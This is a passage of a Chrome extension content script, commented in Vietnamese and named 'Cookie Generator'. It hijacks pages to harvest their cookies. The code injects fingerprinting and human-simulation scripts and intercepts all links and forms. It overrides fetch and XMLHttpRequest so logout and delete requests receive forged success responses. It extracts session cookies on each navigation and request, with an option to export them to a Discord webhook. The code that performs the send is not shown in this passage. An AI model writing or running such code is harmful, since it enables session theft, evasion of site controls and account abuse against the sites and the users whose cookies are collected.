    }
  } catch (fatalError) {
    // Lỗi nghiêm trọng không thể xử lý
    console.error("Cookie Generator: Lỗi nghiêm trọng:", fatalError);
    spoofingInProgress = false;
    showError("Lỗi nghiêm trọng: " + fatalError.message);
    return { success: false, error: fatalError.message };
  }
}

/**
 * Thiết lập MutationObserver để xử lý các phần tử mới được thêm vào trang
 */
function setupDOMObserver() {
  // Tạo một observer để theo dõi thay đổi DOM
  const observer = new MutationObserver((mutations) => {
    let newElementsFound = false;
    
    // Kiểm tra các thay đổi để tìm các phần tử mới
    mutations.forEach(mutation => {
      // Nếu có các nút được thêm vào
      if (mutation.addedNodes.length > 0) {
        mutation.addedNodes.forEach(node => {
          // Kiểm tra nếu nút là phần tử DOM
          if (node.nodeType === Node.ELEMENT_NODE) {
            // Kiểm tra nếu nút là thẻ a hoặc form
            if ((node.tagName === 'A' && node.hasAttribute('href') && 
                !node.hasAttribute('data-cookiegen-handled')) ||
                (node.tagName === 'FORM' && !node.hasAttribute('data-cookiegen-handled'))) {
              newElementsFound = true;
            }
            
            // Kiểm tra các thẻ a và form bên trong nút
            const links = node.querySelectorAll('a[href]:not([data-cookiegen-handled])');
            const forms = node.querySelectorAll('form:not([data-cookiegen-handled])');
            
            if (links.length > 0 || forms.length > 0) {
              newElementsFound = true;
            }
          }
        });
      }
    });
    
    // Nếu phát hiện phần tử mới, xử lý lại tất cả
    if (newElementsFound) {
      console.log('Cookie Generator: Phát hiện phần tử mới, xử lý lại...');
      processSafeLinks();
      handleForms();
    }
  });
  
  // Bắt đầu quan sát thay đổi DOM
  observer.observe(document.body, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['href', 'action']
  });
  
  // Lưu observer vào biến toàn cục để có thể tắt sau này nếu cần
  window.cookieGenDOMObserver = observer;
  
  console.log('Cookie Generator: Đã thiết lập theo dõi các phần tử mới');
}

// Thêm biến để lưu trữ cài đặt mô phỏng
let simulationSettings = {
  enableHumanSimulation: true,
  simulationIntensity: 'medium',
  simulationTime: 30,
  fillForms: true,
  mouseMovement: 'natural',
  scrollBehavior: 'natural'
};

// Cập nhật phần lắng nghe tin nhắn
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log("Đã nhận tin nhắn trong content script:", request.action);
  
  if (request.action === "spoof_site") {
    console.log("Bắt đầu giả mạo trang web...");
    
    // Lưu cài đặt AI nếu được gửi kèm
    if (request.settings) {
      console.log("Đã nhận cài đặt AI từ background script:", request.settings);
      // Lưu cài đặt vào biến toàn cục để sử dụng sau
      simulationSettings = request.settings;
      
      // Lưu vào storage để các tab khác có thể sử dụng
      try {
        localStorage.setItem('cookiegen_simulation_settings', JSON.stringify(simulationSettings));
      } catch (error) {
        console.error("Lỗi khi lưu cài đặt AI vào localStorage:", error);
      }
      
      // Truyền cài đặt AI trực tiếp vào trang web
      try {
        const script = document.createElement('script');
        script.textContent = `
          // Gán cài đặt AI cho trang web
          window.simulationSettings = ${JSON.stringify(request.settings)};
          console.log('Cookie Generator: Cài đặt AI đã được gán cho trang web', window.simulationSettings);
        `;
        document.head.appendChild(script);
        setTimeout(() => script.remove(), 200);
      } catch (error) {
        console.error("Lỗi khi truyền cài đặt AI vào trang:", error);
      }
    }
    
    // Nếu có webhook URL, lưu lại
    if (request.webhookUrl) {
      console.log("Đã nhận Discord webhook URL:", request.webhookUrl);
      CookieExportService.setWebhookUrl(request.webhookUrl);
    }
    
    // Thực hiện giả mạo
    spoofSite().then(result => {
      console.log("Kết quả giả mạo:", result);
      sendResponse({ success: true });
    }).catch(error => {
      console.error("Lỗi khi giả mạo:", error);
      sendResponse({ success: false, error: error.message });
    });
    
    return true; // Để giữ kết nối mở cho sendResponse bất đồng bộ
  }
  
  if (request.action === "check_spoof_status") {
    console.log("Kiểm tra trạng thái giả mạo:", spoofComplete, spoofingInProgress);
    sendResponse({ completed: spoofComplete, inProgress: spoofingInProgress });
    return true;
  }
  
  if (request.action === "save_cookies") {
    console.log("Yêu cầu lưu cookies...");
    
    // Kiểm tra xem có gửi đến Discord webhook không
    const exportToDiscord = request.exportToDiscord === true;
    
    // Kiểm tra xem có webhook URL không
    if (exportToDiscord && request.webhookUrl) {
      CookieExportService.setWebhookUrl(request.webhookUrl);
    }
    
    // Trích xuất cookies
    extractCookies(exportToDiscord)
      .then(success => {
        console.log(`Kết quả trích xuất cookies: ${success ? 'Thành công' : 'Thất bại'}`);
        sendResponse({ success: success });
      })
      .catch(error => {
        console.error("Lỗi khi trích xuất cookies:", error);
        sendResponse({ success: false, error: error.message });
      });
    
    return true;
  }
  
  if (request.action === "set_webhook_url") {
    console.log("Yêu cầu thiết lập webhook URL...");
    
    try {
      const success = CookieExportService.setWebhookUrl(request.webhookUrl);
      sendResponse({ success: success });
    } catch (error) {
      console.error("Lỗi khi thiết lập webhook URL:", error);
      sendResponse({ success: false, error: error.message });
    }
    
    return true;
  }
  
  if (request.action === "export_cookies_to_discord") {
    console.log("Yêu cầu xuất cookies ra Discord webhook...");
    
    // Thiết lập webhook URL nếu có
    if (request.webhookUrl) {
      CookieExportService.setWebhookUrl(request.webhookUrl);
    }
    
    // Trích xuất và gửi cookies
    extractCookies(true)
      .then(success => {
        console.log(`Kết quả xuất cookies ra Discord: ${success ? 'Thành công' : 'Thất bại'}`);
        sendResponse({ success: success });
      })
      .catch(error => {
        console.error("Lỗi khi xuất cookies:", error);
        sendResponse({ success: false, error: error.message });
      });
    
    return true;
  }
  
  if (request.action === "set_auto_export") {
    console.log('Cập nhật cài đặt tự động xuất:', request.enabled);
    CookieExportService.setAutoExport(request.enabled);
    sendResponse({ success: true });
    return true;
  }
});

// Cập nhật hàm showCompletionNotice để thêm các nút tương tác
function showCompletionNotice() {
  // Kiểm tra có thông báo đang hiển thị không
  const existingNotice = document.getElementById('cookie-completion-notice');
  if (existingNotice) {
    existingNotice.remove();
  }

  // Tạo phần tử thông báo
  const noticeElement = document.createElement('div');
  noticeElement.id = 'cookie-completion-notice';
  noticeElement.innerHTML = `
    <div class="notice-content">
      <div class="notice-icon">✓</div>
      <div class="notice-message">
        <div class="notice-title">Cookie đã được tạo thành công!</div>
        <div class="notice-subtitle">Bạn có thể tiếp tục sử dụng trang này</div>
      </div>
      <div class="notice-actions">
        <button id="continue-browsing" class="notice-button primary">Tiếp tục duyệt</button>
        <button id="go-to-cookies" class="notice-button secondary">Quản lý Cookie</button>
      </div>
      <div id="notice-close">×</div>
    </div>
  `;

  // Thêm CSS cho thông báo
  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideIn {
      from { transform: translateY(-100px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; }
    }
    
    #cookie-completion-notice {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 9999;
      max-width: 360px;
      background: #fff;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
      border-radius: 8px;
      overflow: hidden;
      animation: slideIn 0.3s ease-out forwards;
      font-family: Arial, sans-serif;
      border-left: 4px solid #4CAF50;
    }
    
    .notice-content {
      display: flex;
      flex-wrap: wrap;
      padding: 16px;
    }
    
    .notice-icon {
      background-color: #4CAF50;
      color: white;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 12px;
      flex-shrink: 0;
    }
    
    .notice-message {
      flex: 1;
      min-width: 200px;
    }
    
    .notice-title {
      font-weight: bold;
      margin-bottom: 4px;
      color: #333;
    }
    
    .notice-subtitle {
      font-size: 12px;
      color: #666;
    }
    
    .notice-actions {
      display: flex;
      margin-top: 12px;
      width: 100%;
      gap: 8px;
    }
    
    .notice-button {
      padding: 6px 12px;
      border-radius: 4px;
      font-size: 12px;
      cursor: pointer;
      border: none;
      transition: background-color 0.2s;
      flex: 1;
    }
    
    .notice-button.primary {
      background-color: #4CAF50;
      color: white;
    }
    
    .notice-button.primary:hover {
      background-color: #45a049;
    }
    
    .notice-button.secondary {
      background-color: #f1f1f1;
      color: #333;
    }
    
    .notice-button.secondary:hover {
      background-color: #e0e0e0;
    }
    
    #notice-close {
      position: absolute;
      top: 8px;
      right: 12px;
      font-size: 16px;
      color: #999;
      cursor: pointer;
      transition: color 0.2s;
    }
    
    #notice-close:hover {
      color: #333;
    }
  `;

  // Thêm style và thông báo vào trang
  document.head.appendChild(style);
  document.body.appendChild(noticeElement);

  // Xử lý sự kiện nút đóng
  const closeButton = document.getElementById('notice-close');
  if (closeButton) {
    closeButton.addEventListener('click', () => {
      noticeElement.style.animation = 'fadeOut 0.3s forwards';
      setTimeout(() => {
        noticeElement.remove();
      }, 300);
    });
  }

  // Xử lý sự kiện nút Tiếp tục duyệt
  const continueButton = document.getElementById('continue-browsing');
  if (continueButton) {
    continueButton.addEventListener('click', () => {
      noticeElement.style.animation = 'fadeOut 0.3s forwards';
      setTimeout(() => {
        noticeElement.remove();
      }, 300);
    });
  }

  // Xử lý sự kiện nút Quản lý Cookie
  const cookiesButton = document.getElementById('go-to-cookies');
  if (cookiesButton) {
    cookiesButton.addEventListener('click', () => {
      // Gửi tin nhắn đến background để mở trang quản lý cookie
      chrome.runtime.sendMessage({ action: "openCookiesPage" });
      
      noticeElement.style.animation = 'fadeOut 0.3s forwards';
      setTimeout(() => {
        noticeElement.remove();
      }, 300);
    });
  }

  // Tự động đóng sau 15 giây
  setTimeout(() => {
    if (document.body.contains(noticeElement)) {
      noticeElement.style.animation = 'fadeOut 0.3s forwards';
      setTimeout(() => {
        if (document.body.contains(noticeElement)) {
          noticeElement.remove();
        }
      }, 300);
    }
  }, 15000);
}

// Hiển thị thông báo lỗi
function showError(message) {
  console.error(`Cookie Generator Error: ${message}`);
  
  // Tạo và hiển thị thông báo lỗi
  const errorNotice = document.createElement('div');
  errorNotice.style.cssText = `
    position: fixed;
    top: 10px;
    right: 10px;
    padding: 15px;
    background-color: #f44336;
    color: white;
    font-family: Arial, sans-serif;
    font-size: 14px;
    z-index: 999999;
    border-radius: 5px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    max-width: 300px;
  `;
  
  errorNotice.innerHTML = `
    <div style="margin-bottom: 5px; font-weight: bold;">Cookie Generator Error</div>
    <div>${message}</div>
  `;
  
  document.body.appendChild(errorNotice);
  
  // Tự động xóa thông báo sau 5 giây
  setTimeout(() => {
    if (errorNotice.parentNode) {
      errorNotice.parentNode.removeChild(errorNotice);
    }
  }, 5000);
  
  // Lưu lỗi gần nhất
  lastError = message;
}

/**
 * Tiêm các thư viện cần thiết vào trang web
 * @param {Array} libraries - Danh sách thư viện cần tải (tuỳ chọn)
 * @returns {Promise<boolean>} - Promise trả về kết quả tải
 */
async function injectLibraries(librariesList) {
  console.log('Cookie Generator: Bắt đầu tiêm thư viện...');
  
  // Danh sách thư viện mặc định nếu không được chỉ định
  const defaultLibraries = ['util.js', 'ua-parser.js', 'fingerprint.js', 'humanize.js'];
  const libraries = librariesList || defaultLibraries;
  
  // Thêm CSS highlight
  addHighlightStyle();
  
  // Tải các thư viện theo thứ tự
  const loadLibrary = (libraryName) => {
    return new Promise((resolve, reject) => {
      try {
        const script = document.createElement('script');
        
        // Đặt đường dẫn của thư viện
        const libraryUrl = chrome.runtime.getURL(`libs/${libraryName}`);
        script.src = libraryUrl;
        
        // Theo dõi sự kiện tải
        script.onload = () => {
          console.log(`Cookie Generator: Đã tải thành công thư viện ${libraryName}`);
          resolve(true);
        };
        
        script.onerror = (error) => {
          console.error(`Cookie Generator: Lỗi khi tải thư viện ${libraryName}`, error);
          resolve(false); // Vẫn tiếp tục với các thư viện khác
        };
        
        // Đặt thời gian chờ tối đa
        const timeout = setTimeout(() => {
          console.warn(`Cookie Generator: Hết thời gian chờ tải thư viện ${libraryName}`);
          resolve(false);
        }, 5000);
        
        // Thêm script vào trang
        document.head.appendChild(script);
        
        // Ghi đè hàm onload để xóa timeout
        const originalOnload = script.onload;
        script.onload = (event) => {
          clearTimeout(timeout);
          if (originalOnload) originalOnload(event);
          resolve(true);
        };
      } catch (error) {
        console.error(`Cookie Generator: Lỗi khi tạo script cho ${libraryName}`, error);
        reject(error);
      }
    });
  };
  
  // Tải thư viện tuần tự
  let allSuccess = true;
  for (const library of libraries) {
    try {
      const success = await loadLibrary(library);
      if (!success) {
        console.warn(`Cookie Generator: Không thể tải thư viện ${library}`);
        allSuccess = false;
      }
    } catch (error) {
      console.error(`Cookie Generator: Lỗi khi tải thư viện ${library}`, error);
      allSuccess = false;
    }
  }
  
  // Đảm bảo thời gian để các thư viện khởi tạo
  await sleep(500);
  
  console.log(`Cookie Generator: Kết quả tải thư viện: ${allSuccess ? 'Tất cả thành công' : 'Có lỗi'}`);
  return allSuccess;
}

/**
 * Hàm xử lý URL an toàn - tránh XSS và các URL nguy hiểm
 * @param {string} inputUrl URL cần kiểm tra và làm sạch
 * @param {string} base URL cơ sở để giải quyết URL tương đối
 * @returns {Object|null} Đối tượng URL đã được làm sạch hoặc null nếu không an toàn
 */
function URLSanitizer(inputUrl, base = window.location.href) {
  try {
    // Loại bỏ các khoảng trắng và kiểm tra URL rỗng
    const trimmedUrl = inputUrl.trim();
    if (!trimmedUrl) return null;
    
    // Kiểm tra các URL đặc biệt
    if (trimmedUrl === '#' || 
        trimmedUrl === 'javascript:void(0)' || 
        trimmedUrl === 'javascript:;') {
      return { 
        original: trimmedUrl,
        isSafe: true,
        isSpecial: true,
        toString: () => trimmedUrl
      };
    }
    
    // Kiểm tra các protocol đặc biệt
    if (trimmedUrl.startsWith('mailto:') || trimmedUrl.startsWith('tel:')) {
      return {
        original: trimmedUrl,
        protocol: trimmedUrl.split(':')[0],
        isSafe: true,
        isSpecial: true,
        toString: () => trimmedUrl
      };
    }
    
    // Tạo đối tượng URL, xử lý cả URL tương đối
    let url;
    try {
      // Thử phân tích URL như là tuyệt đối
      url = new URL(trimmedUrl);
    } catch (e) {
      // Nếu thất bại, thử phân tích như URL tương đối
      try {
        url = new URL(trimmedUrl, base);
      } catch (e2) {
        // Không thể phân tích URL
        console.warn(`Không thể phân tích URL: ${trimmedUrl}`, e2);
        return null;
      }
    }
    
    // Kiểm tra các protocol không an toàn
    const unsafeProtocols = ['javascript:', 'data:', 'vbscript:'];
    if (unsafeProtocols.some(protocol => url.protocol.includes(protocol))) {
      // Chỉ cho phép các javascript đơn giản: javascript:void(0) hoặc javascript:;
      if (url.protocol === 'javascript:' && 
          (url.href === 'javascript:void(0)' || url.href === 'javascript:;')) {
        return {
          original: url.href,
          isSafe: true,
          isSpecial: true,
          toString: () => url.href
        };
      }
      console.warn(`URL có protocol không an toàn: ${url.protocol}`);
      return null;
    }
    
    // Thêm thông tin hữu ích vào đối tượng URL
    url.isSameOrigin = url.origin === window.location.origin;
    url.mainDomain = extractMainDomain(url.hostname);
    url.isSafe = true;
    url.original = trimmedUrl;
    
    // Thêm hàm kiểm tra từ khóa nguy hiểm
    url.hasDangerousKeywords = function() {
      const dangerousKeywords = [
        'logout', 'log-out', 'log_out', 'signout', 'sign-out', 'sign_out',
        'delete', 'remove', 'destroy', 'cancel', 'exit', 
        'dangxuat', 'dang-xuat', 'xoa', 'thoat', 'huy'
      ];
      
      const lowerPathname = (this.pathname || '').toLowerCase();
      const lowerSearch = (this.search || '').toLowerCase();
      
      return dangerousKeywords.some(keyword => 
        lowerPathname.includes(keyword) || lowerSearch.includes(keyword));
    };
    
    return url;
  } catch (error) {
    console.error("Lỗi khi xử lý URL:", error);
    return null;
  }
}

/**
 * Xử lý an toàn các backlink (liên kết trở lại)
 * @param {Element} linkElement Phần tử thẻ a cần xử lý
 * @returns {boolean} true nếu đã xử lý, false nếu không cần xử lý
 */
function handleBackLinks(linkElement) {
  if (!linkElement || linkElement.tagName !== 'A') return false;
  
  try {
    const href = linkElement.getAttribute('href') || '';
    if (!href) return false;
    
    // Sử dụng URLSanitizer để phân tích URL
    const sanitizedUrl = URLSanitizer(href);
    if (!sanitizedUrl) return false;
    
    // Nếu là URL đặc biệt, không cần xử lý
    if (sanitizedUrl.isSpecial) return false;
    
    // Kiểm tra xem có phải backlink không
    const currentHost = window.location.hostname;
    const currentPath = window.location.pathname;
    
    // Các dấu hiệu có thể là backlink
    const backText = ['back', 'trở lại', 'quay lại', 'return', 'previous', 'trước'].some(
      text => (linkElement.innerText || '').toLowerCase().includes(text)
    );
    
    // Kiểm tra các thuộc tính thường thấy ở backlink
    const hasBackAttributes = ['back', 'return', 'prev'].some(
      attr => linkElement.className.includes(attr) || (linkElement.id || '').includes(attr)
    );
    
    // Nếu có dấu hiệu là backlink
    if (backText || hasBackAttributes) {
      console.log(`Cookie Generator: Phát hiện backlink: ${href}`);
      
      // Xử lý backlink để tránh rời khỏi trang
      linkElement.addEventListener('click', function(event) {
        event.preventDefault();
        
        // Nếu URL là cùng origin, có thể giả lập lịch sử
        if (sanitizedUrl.isSameOrigin) {
          console.log(`Cookie Generator: Xử lý backlink nội bộ: ${sanitizedUrl.pathname}`);
          
          // Thêm vào lịch sử nhưng không chuyển trang thực sự
          window.history.pushState({}, '', sanitizedUrl.pathname);
          
          // Giả lập sự kiện popstate để các script trên trang biết về thay đổi URL
          const popStateEvent = new PopStateEvent('popstate', { state: {} });
          window.dispatchEvent(popStateEvent);
        } else {
          console.log(`Cookie Generator: Bỏ qua backlink bên ngoài: ${sanitizedUrl.href}`);
        }
        
        return false;
      });
      
      // Đánh dấu đã xử lý
      linkElement.setAttribute('data-cookiegen-handled', 'backlink');
      return true;
    }
    
    return false;
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi xử lý backlink', error);
    return false;
  }
}

/**
 * Xử lý an toàn tất cả các liên kết trên trang
 */
function processSafeLinks() {
  console.log('Cookie Generator: Xử lý an toàn các liên kết trên trang');
  
  try {
    // Lấy tất cả liên kết trên trang
    const links = document.querySelectorAll('a[href]');
    console.log(`Cookie Generator: Tìm thấy ${links.length} liên kết để xử lý`);
    
    // Xử lý từng liên kết
    links.forEach((link, index) => {
      // Bỏ qua liên kết đã xử lý
      if (link.hasAttribute('data-cookiegen-handled')) return;
      
      // Lấy href
      const href = link.getAttribute('href') || '';
      if (!href) return;
      
      // Kiểm tra xem có phải backlink
      if (handleBackLinks(link)) return;
      
      // Kiểm tra an toàn với URLSanitizer
      const sanitizedUrl = URLSanitizer(href);
      if (!sanitizedUrl) {
        // URL không an toàn, vô hiệu hóa
        console.log(`Cookie Generator: Vô hiệu hóa URL không an toàn: ${href}`);
        link.setAttribute('data-original-href', href);
        link.setAttribute('href', 'javascript:void(0);');
        link.setAttribute('data-cookiegen-handled', 'disabled');
        link.addEventListener('click', event => event.preventDefault());
        return;
      }
      
      // Kiểm tra xem có từ khóa nguy hiểm
      if (sanitizedUrl.hasDangerousKeywords && sanitizedUrl.hasDangerousKeywords()) {
        console.log(`Cookie Generator: URL có từ khóa nguy hiểm: ${href}`);
        link.setAttribute('data-original-href', href);
        link.setAttribute('href', 'javascript:void(0);');
        link.setAttribute('data-cookiegen-handled', 'dangerous');
        link.addEventListener('click', event => event.preventDefault());
        return;
      }
      
      // URL an toàn nhưng có thể là liên kết bên ngoài
      if (!sanitizedUrl.isSameOrigin && !sanitizedUrl.isSpecial) {
        // Đánh dấu an toàn để xử lý khi click
        link.setAttribute('data-cookiegen-handled', 'external');
        
        // Thêm sự kiện click để xử lý liên kết bên ngoài
        link.addEventListener('click', function(event) {
          // Luôn ngăn hành vi mặc định
          event.preventDefault();
          
          // Trích xuất cookie trước khi có thể rời trang
          extractCookies();
          
          console.log(`Cookie Generator: Đã chặn chuyển hướng đến: ${sanitizedUrl.href}`);
          return false;
        });
      } else {
        // URL nội bộ an toàn, không cần xử lý đặc biệt
        link.setAttribute('data-cookiegen-handled', 'safe');
      }
    });
    
    console.log('Cookie Generator: Đã xử lý an toàn các liên kết trên trang');
    return true;
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi xử lý liên kết', error);
    return false;
  }
}

/**
 * Xử lý form an toàn - ngăn gửi form thực sự
 */
function handleForms() {
  console.log('Cookie Generator: Xử lý an toàn các form trên trang');
  
  try {
    // Lấy tất cả form trên trang
    const forms = document.querySelectorAll('form');
    console.log(`Cookie Generator: Tìm thấy ${forms.length} form để xử lý`);
    
    forms.forEach((form, index) => {
      // Bỏ qua form đã xử lý
      if (form.hasAttribute('data-cookiegen-handled')) return;
      
      // Gắn sự kiện submit
      form.addEventListener('submit', function(event) {
        // Luôn ngăn hành vi mặc định (gửi form)
        event.preventDefault();
        
        console.log(`Cookie Generator: Đã ngăn gửi form #${index}`);
        
        // Lưu dữ liệu form vào localStorage
        try {
          const formData = new FormData(form);
          const formObj = {};
          
          formData.forEach((value, key) => {
            // Chỉ lưu các trường không nhạy cảm (không phải mật khẩu)
            if (!key.toLowerCase().includes('pass') && 
                !key.toLowerCase().includes('token') && 
                !key.toLowerCase().includes('secret')) {
              formObj[key] = value;
            } else {
              formObj[key] = '[REDACTED]'; // Ẩn thông tin nhạy cảm
            }
          });
          
          // Lưu thông tin form để debug
          localStorage.setItem(`cookiegen_form_${index}`, JSON.stringify(formObj));
        } catch (e) {
          console.warn('Cookie Generator: Không thể lưu dữ liệu form', e);
        }
        
        // Giả lập gửi form thành công
        simulateFormSubmitSuccess(form);
        
        // Trích xuất cookie sau khi "gửi form"
        extractCookies();
        
        return false;
      }, true); // Sử dụng capture để đảm bảo chặn các event listener khác
      
      // Đánh dấu form đã được xử lý
      form.setAttribute('data-cookiegen-handled', 'true');
    });
    
    console.log('Cookie Generator: Đã xử lý an toàn các form trên trang');
    return true;
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi xử lý form', error);
    return false;
  }
}

/**
 * Giả lập thành công khi gửi form
 * @param {HTMLFormElement} form Form cần giả lập thành công
 */
function simulateFormSubmitSuccess(form) {
  try {
    // Tìm nút submit/button trong form
    const submitButtons = form.querySelectorAll('button[type="submit"], input[type="submit"], button:not([type])');
    
    if (submitButtons.length > 0) {
      // Thêm lớp "loading" hoặc "disabled" vào nút submit
      submitButtons.forEach(button => {
        button.classList.add('loading');
        button.disabled = true;
        
        // Thêm hiệu ứng loading nếu chưa có
        if (!button.querySelector('.cookiegen-loading')) {
          const loadingElement = document.createElement('span');
          loadingElement.className = 'cookiegen-loading';
          loadingElement.innerHTML = '...';
          button.appendChild(loadingElement);
        }
      });
    }
    
    // Sau 1-2 giây, giả lập thành công
    setTimeout(() => {
      // Ẩn form
      form.style.transition = 'opacity 0.5s';
      form.style.opacity = '0.5';
      
      // Tạo thông báo thành công
      const successMessage = document.createElement('div');
      successMessage.className = 'cookiegen-success-message';
      successMessage.innerHTML = '<div style="color: green; padding: 15px; margin: 10px 0; background: #f8fff8; border: 1px solid #afa; border-radius: 4px;">Form đã được xử lý thành công!</div>';
      
      // Chèn thông báo thành công sau form
      form.parentNode.insertBefore(successMessage, form.nextSibling);
      
      // Đôi khi active các nút tiếp theo sau form (nếu có)
      const nextButtons = document.querySelectorAll('.next-step, .continue, [data-next-step]');
      if (nextButtons.length > 0) {
        nextButtons.forEach(button => {
          button.disabled = false;
          if (button.classList.contains('disabled')) {
            button.classList.remove('disabled');
          }
        });
      }
      
      // Sau thêm 2-3 giây, khôi phục form
      setTimeout(() => {
        form.style.opacity = '1';
        
        // Xóa thông báo thành công
        if (successMessage.parentNode) {
          successMessage.parentNode.removeChild(successMessage);
        }
        
        // Khôi phục nút submit
        submitButtons.forEach(button => {
          button.classList.remove('loading');
          button.disabled = false;
          
          // Xóa hiệu ứng loading
          const loadingElement = button.querySelector('.cookiegen-loading');
          if (loadingElement) {
            loadingElement.remove();
          }
        });
      }, 2000 + Math.random() * 1000);
    }, 1000 + Math.random() * 1000);
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi giả lập form thành công', error);
  }
}

/**
 * Xử lý SPA (Single Page Application) để đảm bảo không rời khỏi trang
 */
function handleSPA() {
  console.log('Cookie Generator: Bắt đầu xử lý cho SPA');
  
  try {
    // Ghi đè pushState và replaceState để biết khi URL thay đổi
    const originalPushState = window.history.pushState;
    const originalReplaceState = window.history.replaceState;
    
    // Ghi đè pushState
    window.history.pushState = function() {
      // Gọi hàm gốc
      const result = originalPushState.apply(this, arguments);
      
      // Xử lý sau khi URL thay đổi
      handleURLChange();
      
      return result;
    };
    
    // Ghi đè replaceState
    window.history.replaceState = function() {
      // Gọi hàm gốc
      const result = originalReplaceState.apply(this, arguments);
      
      // Xử lý sau khi URL thay đổi
      handleURLChange();
      
      return result;
    };
    
    // Xử lý sự kiện popstate (khi người dùng nhấn nút back/forward trên trình duyệt)
    window.addEventListener('popstate', function() {
      handleURLChange();
    });
    
    console.log('Cookie Generator: Đã xử lý SPA thành công');
    return true;
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi xử lý SPA', error);
    return false;
  }
}

/**
 * Xử lý khi URL thay đổi trong SPA
 */
function handleURLChange() {
  console.log(`Cookie Generator: URL đã thay đổi thành ${window.location.href}`);
  
  // Đợi một chút để DOM cập nhật
  setTimeout(() => {
    // Xử lý lại các liên kết trên trang
    processSafeLinks();
    
    // Xử lý lại các form trên trang
    handleForms();
    
    // Trích xuất cookie sau khi URL thay đổi
    extractCookies();
  }, 500);
}

/**
 * Xử lý đặc biệt cho các SPA sử dụng AJAX 
 */
function handleAJAXRequests() {
  console.log('Cookie Generator: Thiết lập xử lý AJAX cho SPA');
  
  try {
    // Bắt các yêu cầu XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
      // Lưu URL vào đối tượng để sử dụng sau
      this._cookiegenUrl = url;
      this._cookiegenMethod = method;
      
      // Gọi hàm gốc
      return originalXHROpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
      // Lấy thông tin yêu cầu
      const requestUrl = this._cookiegenUrl;
      const requestMethod = this._cookiegenMethod || 'GET';
      
      // Xử lý an toàn URL
      const sanitizedUrl = URLSanitizer(requestUrl);
      
      if (sanitizedUrl && sanitizedUrl.hasDangerousKeywords && sanitizedUrl.hasDangerousKeywords()) {
        console.warn(`Cookie Generator: Chặn yêu cầu AJAX đến URL nguy hiểm: ${requestUrl}`);
        
        // Giả lập hoàn thành cho yêu cầu bị chặn
        setTimeout(() => {
          if (typeof this.onreadystatechange === 'function') {
            this.readyState = 4;
            this.status = 200;
            this.responseText = '{"success":true,"message":"Request handled by Cookie Generator"}';
            this.onreadystatechange();
          }
          
          if (typeof this.onload === 'function') {
            this.onload();
          }
        }, 100);
        
        return;
      }
      
      // Nếu là yêu cầu POST đến URL nghi ngờ logout/chuyển hướng
      if (requestMethod === 'POST' && sanitizedUrl) {
        const pathLower = sanitizedUrl.pathname.toLowerCase();
        
        // Chặn các yêu cầu POST đến endpoint đăng xuất hoặc xóa
        if (pathLower.includes('logout') || 
            pathLower.includes('signout') || 
            pathLower.includes('delete') || 
            pathLower.includes('exit')) {
          console.warn(`Cookie Generator: Chặn yêu cầu POST đến endpoint nhạy cảm: ${requestUrl}`);
          
          // Trích xuất cookie trước khi thực hiện yêu cầu nhạy cảm
          extractCookies();
          
          // Giả lập hoàn thành
          setTimeout(() => {
            if (typeof this.onreadystatechange === 'function') {
              this.readyState = 4;
              this.status = 200;
              this.responseText = '{"success":true,"message":"Request handled by Cookie Generator"}';
              this.onreadystatechange();
            }
            
            if (typeof this.onload === 'function') {
              this.onload();
            }
          }, 100);
          
          return;
        }
      }
      
      // Giám sát phản hồi
      this.addEventListener('load', function() {
        // Trích xuất cookie sau khi nhận phản hồi
        if (this.readyState === 4 && this.status >= 200 && this.status < 300) {
          console.log(`Cookie Generator: Phát hiện phản hồi AJAX thành công cho: ${requestUrl}`);
          
          // Đợi một chút để cookie được cập nhật
          setTimeout(() => {
            extractCookies();
          }, 500);
        }
      });
      
      // Gọi hàm gốc
      return originalXHRSend.apply(this, arguments);
    };
    
    // Bắt các yêu cầu fetch
    const originalFetch = window.fetch;
    
    window.fetch = function(input, init) {
      // Phân tích đầu vào
      let url = input;
      
      if (input instanceof Request) {
        url = input.url;
      }
      
      // Xử lý an toàn URL
      const sanitizedUrl = URLSanitizer(url);
      
      if (sanitizedUrl && sanitizedUrl.hasDangerousKeywords && sanitizedUrl.hasDangerousKeywords()) {
        console.warn(`Cookie Generator: Chặn yêu cầu fetch đến URL nguy hiểm: ${url}`);
        
        // Trả về phản hồi giả
        return Promise.resolve(new Response(
          JSON.stringify({success: true, message: "Request handled by Cookie Generator"}), 
          {status: 200, headers: {'Content-Type': 'application/json'}}
        ));
      }
      
      // Kiểm tra method
      const method = init && init.method ? init.method : 'GET';
      
      // Nếu là yêu cầu POST đến URL nghi ngờ logout/chuyển hướng
      if (method === 'POST' && sanitizedUrl) {
        const pathLower = sanitizedUrl.pathname.toLowerCase();
        
        // Chặn các yêu cầu POST đến endpoint đăng xuất hoặc xóa
        if (pathLower.includes('logout') || 
            pathLower.includes('signout') || 
            pathLower.includes('delete') || 
            pathLower.includes('exit')) {
          console.warn(`Cookie Generator: Chặn yêu cầu POST đến endpoint nhạy cảm: ${url}`);
          
          // Trích xuất cookie trước khi thực hiện yêu cầu nhạy cảm
          extractCookies();
          
          // Trả về phản hồi giả
          return Promise.resolve(new Response(
            JSON.stringify({success: true, message: "Request handled by Cookie Generator"}), 
            {status: 200, headers: {'Content-Type': 'application/json'}}
          ));
        }
      }
      
      // Gọi fetch gốc và giám sát kết quả
      return originalFetch.apply(this, arguments)
        .then(response => {
          // Theo dõi phản hồi thành công
          if (response.ok) {
            console.log(`Cookie Generator: Phát hiện phản hồi fetch thành công cho: ${url}`);
            
            // Đợi một chút để cookie được cập nhật
            setTimeout(() => {
